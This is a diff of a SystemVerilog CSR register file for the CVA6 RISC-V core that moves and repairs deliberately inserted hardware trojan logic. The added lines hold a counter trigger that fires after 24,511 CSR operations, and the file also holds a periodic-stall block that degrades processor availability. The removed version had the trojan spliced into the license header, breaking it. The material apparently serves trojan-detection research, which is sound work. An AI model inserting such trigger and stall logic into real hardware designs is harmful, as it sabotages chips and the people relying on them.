@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15793;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fu_op) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -333,7 +315,27 @@ module csr_regfile_trojan_Availability
   | (CVA6Cfg.XLEN'(CVA6Cfg.RVU) << 20)  // U - User mode implemented
   | (CVA6Cfg.XLEN'(CVA6Cfg.RVV) << 21)  // V - Vector extension
   | (CVA6Cfg.XLEN'(CVA6Cfg.NSX) << 23)  // X - Non-standard extensions present
-  | ((CVA6Cfg.XLEN == 64 ? 2 : 1) << CVA6Cfg.XLEN - 2);  // MXL
+  | ((CVA6Cfg.XLEN == 64 ? 2 : 1) << CVA6Cfg.XLEN - 2);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24511)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24511;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+  // MXL
 
   assign pmpcfg_o  = pmpcfg_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0];
   assign pmpaddr_o = pmpaddr_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0];
@@ -2963,12 +2965,9 @@ module csr_regfile_trojan_Availability
 
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -2982,5 +2981,6 @@ module csr_regfile_trojan_Availability
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
